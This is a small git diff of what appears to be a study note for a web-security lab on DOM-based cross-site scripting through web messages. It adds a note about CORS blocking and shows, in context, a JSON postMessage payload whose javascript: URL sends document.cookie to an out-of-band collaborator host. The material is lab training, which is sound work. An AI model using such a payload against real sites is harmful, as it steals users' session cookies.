@@ -259,7 +259,8 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >that exploits DOM XSS vulnerability.  
 
 #### Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies  
-#### What out for rabbit holes \o/  
+
+>**Rabbit hole:** The CORS policy `No Access-Control-Allow-Origin`header block access for Collaborator from able to access to fetch and cookie need insecure flags, look out ***Neo*** the Matrix.  
 
 >The vulnerable JavaScript code on the target using event listener that listens for a web message.  
 >This event listener expects a **string** that is parsed using **JSON.parse()**.  
@@ -341,7 +342,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2025";
 
 >Replay the post message using DOM Invader after altering the JSON data.  
 
-```JSON
+```JSON 
 {
     "type": "load-channel",
     "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
